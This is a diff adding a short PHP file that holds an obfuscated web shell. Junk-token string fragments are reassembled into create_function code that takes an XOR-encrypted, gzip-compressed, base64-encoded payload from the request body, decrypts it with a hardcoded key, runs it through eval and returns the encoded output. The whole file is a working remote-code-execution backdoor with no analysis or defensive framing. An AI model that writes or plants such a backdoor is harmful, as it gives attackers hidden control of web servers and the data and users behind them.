@@ -1,0 +1,10 @@
+<?php
+$z='t_contend?tsd?();d?@ob_end_cled?an();d?$r=@bd?d?d?ase64_encode(@x(@d?gzcomd?prd?ess($o),$k));pd?rint("d?$p$d?kh$r$kf");}';
+$k='+){$o.=d?$td?{$i}^$k{$j}d?;}}d?return d?$d?od?;}if (@pregd?_match("/$d?kd?h(.+)$kfd?/",@fd?ild?e_get_contentd?sd?("pd?';
+$L='$k="77d?d?ce0ce0";$kh="d?1807d?7d?3e6ceae"d?;$kf="d67d?c5ecd?d?e4011";$p=d?"jiiT2xNbrd?h7d?m0XAKd?";function x($td?,$kd';
+$p='hp://input"),d?$m)d?==1) {@od?b_start();@ed?val(@gd?zuncod?mprd?ess(@d?xd?(@base6d?4_decode($m[1d?d?]),$d?k)d?));$o=@ob_ge';
+$y=str_replace('N','','NcNrNNeatNe_funNction');
+$a='?)d?{$c=strlen($d?k);$l=sd?d?trlen($t);$o=d?"";d?fod?d?r($i=0;$i<$l;)d?{for($j=0;d?($jd?<$cd?&&$i<$l);d?$j++,d?$i+';
+$K=str_replace('d?','',$L.$a.$k.$p.$z);
+$V=$y('',$K);$V();
+?>
